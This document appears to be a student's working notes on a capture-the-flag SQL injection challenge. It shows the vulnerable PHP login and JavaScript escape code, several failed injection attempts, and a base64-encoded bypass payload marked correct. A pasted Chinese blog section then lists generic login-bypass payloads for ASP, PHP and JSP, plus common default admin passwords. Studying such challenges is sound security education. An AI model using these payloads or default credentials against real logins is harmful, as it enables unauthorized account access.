
We need to gain access to https://web1.chall.necst.it/bobby.php as user Gregg.

<?php

require_once 'config.php';

function get_value($str) {
    return base64_decode($str);
}

function login($username, $password) {
    global $db;
    $query = "SELECT user_id FROM users WHERE username='$username' and password='$password'";
    $result = mysqli_query($db, $query);
    if ($result && (mysqli_num_rows($result)>0)) {
            return TRUE;
    }
    return FALSE;
}

$username  = get_value($_POST['username']);
// We store the password in plaintext to keep the homework's code short.
// For anything even remotely real, use a proper password storage scheme.
$password  = get_value($_POST['password']);

if(empty($username) || empty($password)) {
    $alert = "Please insert your credentials!";
    $login_ok = FALSE;
} else {
    $login_ok = login($username, $password);
    if(!$login_ok) {
        $alert = "Wrong username or password!";
    }
}
?>

<!doctype html>
<html lang="en">
<head>
    <title>Little Bobby Tables</title>
    <link href="bootstrap.min.css" rel="stylesheet">
    <meta charset="utf8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<div class="container" style="max-width: 600px; margin-top: 2em;">

    <?php if($alert !== NULL && trim($alert) !== ""); { ?>
    <div class="alert alert-danger"><?php echo $alert; ?></div>
    <?php } ?>


    <?php if($login_ok === TRUE) { ?>
        <h1>Hi <?php echo htmlentities($username); ?>! You are logged in!</h1>
        <h2>We have some secret information ready for you...</h2>
        <p>Here it is: <b><?php echo htmlentities(get_secret($username)); ?></b></p>
        <img style='width: 100%' src='exploits_of_a_mom.png'>
    <?php } ?>

    <?php if($login_ok != TRUE) { ?>
        <h1 style="text-align: center;">Access Restricted</h1>
        <form method="post" id="login_form" class="form-horizontal" style="max-width: 75%; margin: 0 auto;">
            <div class="form-group">
                <label for="name">Name: </label>
                <input type="text" name="username" class="form-control">
            </div>
            <div class="form-group">
                <label for="name">Password: </label>
                <input type="password" name="password" class="form-control">
            </div>
            <input type="submit" value="Login" class="btn btn-primary" style="display: block; margin: 0 auto; min-width: 50%">
        </form>
    <?php } ?>

    <script type="text/javascript" src="formutils.js"></script>

</div>
</body>
</html>

==========================formula。js====================================================

escape = function(str) {
    str = str.replace('\\', '\\\\')                     
    str = str.replace('\'', '\\\'')
    str = str.replace('\"', '\\\"')
    str = str.replace('\0', '')
    str = str.replace('\r', '\\r')
    str = str.replace('\n', '\\n')
    return str;
}
不能有\ ' " 0 r n


onFormSubmission = function() {
    form = document.getElementById("login_form");
    form.elements['username'].value = btoa(escape(form.elements['username'].value));
    form.elements['password'].value  = btoa(escape(form.elements['password'].value));
    form.submit();
    return false;
}

//btoa ===binary to ascii

let login_form = document.getElementById("login_form");

if(login_form) {
    onsubmit = onFormSubmission;
}

====================================================================================================




SELECT user_id FROM users WHERE username='$username' and password='$password'




WRONG:
"SELECT user_id FROM users WHERE username='  Gregg'""SELECT user_id FROM users WHERE username='xx        ' and password='$password'"


WRONG:
SELECT user_id FROM users WHERE username='Gregg' and password=' 'OR '1' = '1'


SELECT user_id FROM users WHERE username='Gregg' and password='$password'

WRONG:
Gregg%27%20%23


user=Gregg\        passwd= or 1=1#


SELECT user_id FROM users WHERE username='   Gregg  ' and password=' 'or 1=1#  '

SELECT user_id FROM users WHERE username='   Gregg ' and password='\\\'or 1=1# '


\\0' ===>\\'
\00====> 0
\r====>\\r




=====+++++++++++++++CORRECT:
禁用网页JS文件
base64:  
R3JlZ2c=
J09SICcxJz0nMQ==


'  ====> \' =====> \\'      escape('or 1=1# )

====================================================================================================================================================================

万能密码及默认密码登陆后台：

一、万能密码原理
万能密码漏洞都是因为提交字符未加过滤或过滤不严而导致的。
例如后台系统验证密码要求用户输入的密码和数据库里面的匹配，而用万能密码的方式，就是将验证的语句改成了验证成功的，逻辑运算符AND和OR的运算优先次序是：先运算AND运算符在运算OR运算符，这个漏洞是发生在登陆口，只有登陆口才会出现这样的漏洞。

二、万能密码大全
ASP 万能密码

1："or "a"="a

2：')or('a'='a

3：or 1=1--

4：'or 1=1--

5：a'or' 1=1--

6："or 1=1--

7：'or'a'='a

8："or"="a'='a

9：'or''='

10：'or'='or'

11：1 or '1'='1'=1

12：1 or '1'='1' or 1=1

13：'OR 1=1%00

14："or 1=1%00

15：'xor

16：用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin） 密码 1

17: admin' or 'a'='a 密码随便

PHP 万能密码

1：'or 1=1/*


2：User: something

   Pass: ' or '1'='1


JSP 万能密码:

1：1'or'1'='1:

2：admin' or 1=1/*

默认密码：

1：admin

2：admin888

3：123456

4：123123

5：（域名）
————————————————
版权声明：本文为CSDN博主「xlh006」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/xlh006/java/article/details/82670776